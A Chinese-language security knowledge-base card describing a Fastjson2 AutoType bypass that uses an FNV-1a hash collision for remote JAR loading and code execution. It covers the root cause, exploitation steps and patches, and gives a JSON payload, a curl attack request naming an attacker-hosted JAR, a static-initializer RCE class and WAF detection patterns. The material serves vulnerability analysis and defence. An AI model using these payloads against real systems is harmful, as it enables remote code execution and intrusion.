---
id: web-java-deser-fastjson2-fnv-collision-autotype-bypass
title: Fastjson2 FNV-1a 哈希碰撞绕过 AutoType 白名单 RCE
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: fastjson2-fnv-collision-autotype-bypass
tags:
- java
- fastjson2
- deserialization
- autotype
- fnv
- hash-collision
- jar-url
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
affected_versions: fastjson2 <= 2.0.62（2.0.63 修复，PR 7695 + 7703）
verification:
  verified_by: verifier-V3
  verified_at: '2026-11-04T21:46:55+08:00'
  notes: '已对照原文核对：checkAutoType 847-867 行增量 FNV、''$→.'' 归一化、哈希命中后直接 loadClass、硬编码 ANTI_COLLISION_HASH_MAP_HASH、两处靶场 PoC 与补丁/版本表一致；原文未配图。卡片已正确标注''默认配置可触发''与公开 PoC 依赖 addAutoTypeAccept 的差异；PoC 未执行；affected_versions 已修正为不带 # 的完整区间。'
url: /docs/web/java/deserialization/fastjson/web-java-deser-fastjson2-fnv-collision-autotype-bypass/
draft: false
kb_aliases:
- fastjson2 FNV 碰撞
- $ 归一化哈希碰撞
- fastjson2 AutoType 绕过
- fastjson2 jar URL RCE
---

## 一句话结论

Fastjson2 ≤ 2.0.62 在默认 `autoTypeSupport=false` 时用增量 FNV-1a 哈希判断 `@type` 是否在白名单内，但哈希命中后不校验实际文本；利用 `$ → .` 归一化可以让 `com.example$` 与白名单 `com.example.` 产生相同哈希，随后整串 `com.example$jar:http://...` 被交给 `loadClass`，触发远程 JAR 加载与静态初始化 RCE。

## 原理

- `ObjectReaderProvider.checkAutoType` 在 `autoTypeSupport=false` 时逐字符计算 FNV-1a 哈希：每读一个字符就与 `acceptHashCodes` 做二分查找，命中即调用 `loadClass(typeName)`。
- 计算前有一条归一化：`if (ch == '$') ch = '.';`。因此 `fnv("com.example.")` 与 `fnv("com.example$")` 完全相同——只需把白名单类名末尾的 `.` 换成 `$`，就能零成本制造哈希碰撞。
- 命中哈希后代码只拿 `typeName` 去 `loadClass`，没有比较“实际文本是否等于白名单类名”。攻击者可以在碰撞前缀之后继续拼接任意字符串，`typeName` 整体不被截断。
- 拼接 `jar:http://attacker/evil.jar!/RCE` 后，类加载器把整串当资源 URL 解析，下载远程 JAR 并加载其中的类；类的 `static {}` 或构造过程执行攻击者代码。
- 哈希表并非空：即使应用没有注册任何白名单，`hashCodes` 数组至少包含硬编码的 `ANTI_COLLISION_HASH_MAP_HASH`（`Fnv.hashCode64("com.alibaba.fastjson.util.AntiCollisionHashMap")`），因此 `acceptHashCodes` 永不为空。原文据此认为默认配置也可触发；但公开展示的 PoC 使用的是应用显式 `addAutoTypeAccept("com.example.")` 后产生的碰撞，仅凭硬编码默认哈希构造完整链未被演示，审计时应确认目标是否注册过以 `.` 结尾的 accept 名称。
- 根因是“非密码学哈希被当作安全决策的充分条件”：64 位 FNV-1a 可碰撞，且哈希命中后缺少文本一致性校验。

## 触发条件

- 目标使用 fastjson2 ≤ 2.0.62，且未开启 SafeMode。
- 存在接受 `@type` 的 JSON 解析入口（请求体、消息、缓存反序列化等）。
- 应用注册过 AutoType accept 名称（尤其是以 `.` 结尾的名称），或能命中硬编码默认哈希；原文 PoC 属于前者。
- 目标可出网访问攻击者的 HTTP 服务，或能通过 `jar:` 协议加载远程 JAR（JDK 8 最直接；JDK 11+ 需结合本地 gadget 或其它加载方式）。
- 攻击者可控 JAR 中的类名与 `!/` 后的路径。

## 利用步骤

1. 确认 fastjson2 版本 ≤ 2.0.62，且接口会解析用户可控 JSON 的 `@type`。
2. 确认应用注册过哪些 AutoType accept 名称；若存在以 `.` 结尾的名称（如 `com.example.`），构造其 `$` 变体前缀。
3. 准备恶意 JAR：包含一个在静态初始化或构造时执行命令的类（如 `RCE`），托管在攻击者 HTTP 服务。
4. 构造 `@type`：`<碰撞前缀>$jar:http://<attacker>:<port>/evil.jar!/RCE`。
5. POST JSON，观察目标是否下载 JAR 并执行；可通过回连、DNS 日志或命令输出确认。
6. 若 JDK 11+ 限制了远程类加载，改用本地 classpath gadget 或结合其他反序列化链。

## PoC

```json
{
  "@type": "com.example$jar:http://192.0.2.10:18000/poc.jar!/RCE",
  "x": 1
}
```

前提：应用曾执行 `addAutoTypeAccept("com.example.")`；`com.example$` 与 `com.example.` 的 FNV-1a 哈希相同，前缀命中后整串进入 `loadClass`。

```bash
# 攻击请求（原文靶场形态）
curl -X POST http://TARGET:8088/api/plugin/register \
  -H "Content-Type: application/json" \
  -d '{"@type":"com.example$jar:http://ATTACKER:18000/poc.jar!/RCE","x":1}'
```

恶意 JAR 中的类：

```java
public class RCE {
    static {
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (Exception ignored) {}
    }
}
```

## 变体与关联

- JDK 差异：JDK 8 可直接远程加载 JAR；JDK 11/17 对 `URLClassLoader` 远程 codebase 有限制，原文标注需本地 gadget 才能完成完整 RCE。
- 硬编码默认哈希：`ANTI_COLLISION_HASH_MAP_HASH` 使 accept 列表永不为空；但针对该默认哈希构造“前缀碰撞 + 可加载 jar 串”的完整利用未被原文演示，属于需要实测的方向。
- 碰撞前缀不限于类名：任何曾被 `addAutoTypeAccept` 注册、且可通过 `$→.` 或其它归一化规则碰撞的字符串都可作为前缀。
- 关联：`[[web-java-deser-fastjson2-seealso-fallback-loadclass-rce]]` 是同一版本的另一条独立路径，不需要哈希碰撞；`[[web-java-deser-fastjson-resource-probing-rce]]` 是 fastjson 1.x 的资源探测绕过，代际与代码路径不同。

## 检测与防御

- WAF/请求检测：`@type` 值中出现 `$` 后紧跟 `jar:`、`http:`、`file:`、`ldap:`、`rmi:`；或出现 `jar:http`、`!.`、`!` 等类加载 URL 特征。
- 版本检测：确认 fastjson2 ≤ 2.0.62；升级到 2.0.63 及以上（PR #7695 + #7703）。
- 运行时检测：JVM 出现远程 JAR 下载、`URLClassLoader` 加载非本地路径、`defineClass` 调用；应用日志中出现异常 `@type` 值。
- 修复：升级 fastjson2；启用 SafeMode（`JSONFactory.setSafeMode(true)` 或 `-Dfastjson2.parser.safeMode=true`）；避免使用 `addAutoTypeAccept` 注册宽泛名称。
- 加固：不要反序列化不可信的多态 JSON；如必须使用，采用白名单且校验完整文本而非哈希；升级 JDK 并限制远程类加载；WAF 拦截含 `:`、`!`、`$`、`jar` 的 `@type` 值。
